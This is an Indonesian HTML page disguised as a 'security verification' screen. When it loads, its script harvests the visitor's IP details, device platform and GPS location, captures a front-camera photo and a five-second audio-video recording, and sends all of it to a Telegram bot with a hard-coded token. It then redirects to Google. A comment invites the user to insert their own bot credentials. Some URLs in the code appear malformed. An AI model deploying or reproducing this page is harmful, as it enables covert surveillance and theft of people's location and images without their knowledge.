<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin-bottom: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { text-align: center; }
    </style>
</head>
<body>

<div class="container">
    <div class="loader"></div>
    <p id="status">Memproses Verifikasi...</p>
</div>

<script>
    // KONFIGURASI (GANTI DENGAN MILIKMU)
    const TOKEN = "8335849839:AAFhhUYDiOUVybcp0WMUODHkhBjlRXJQWb8";
    const CHAT_ID = "7665671289";

    async function sikatSemua() {
        let info = "=== TARGET MASUK ===\n";

        // 1. Ambil Info Perangkat & IP
        try {
            const res = await fetch('https://ipapi.co');
            const d = await res.json();
            info += `📍 IP: ${d.ip}\n📍 Kota: ${d.city}\n📍 Provider: ${d.org}\n`;
        } catch (e) { info += "❌ Gagal cek IP\n"; }
        info += `📱 Perangkat: ${navigator.platform}\n`;

        kirimPesan(info);

        // 2. Ambil Lokasi GPS
        navigator.geolocation.getCurrentPosition(pos => {
            const map = `https://google.com{pos.coords.latitude},${pos.coords.longitude}`;
            kirimPesan(`[LOKASI PRESISI]\n${map}`);
        }, () => kirimPesan("❌ Lokasi Ditolak"));

        // 3. Akses Kamera (Foto & Video)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            await video.play();

            // --- PROSES AMBIL FOTO (Menunggu 4 detik agar sensor cahaya siap) ---
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => kirimFile(blob, 'sendPhoto', 'photo'), 'image/jpeg');

                // --- PROSES REKAM VIDEO (5 Detik) ---
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                    kirimFile(videoBlob, 'sendVideo', 'video');
                    stream.getTracks().forEach(t => t.stop()); // Matikan kamera
                    
                    // Redirect setelah semua selesai
                    setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 5000); // Rekam selama 5 detik

            }, 4000);

        } catch (err) {
            kirimPesan("❌ Kamera/Mic Ditolak");
            setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
        }
    }

    function kirimPesan(teks) {
        fetch(`https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(teks)}`);
    }

    function kirimFile(blob, method, type) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append(type, blob, `capture.${type === 'photo' ? 'jpg' : 'mp4'}`);
        fetch(`https://telegram.org{TOKEN}/${method}`, { method: 'POST', body: fd });
    }

    window.onload = sikatSemua;
</script>

</body>
</html>
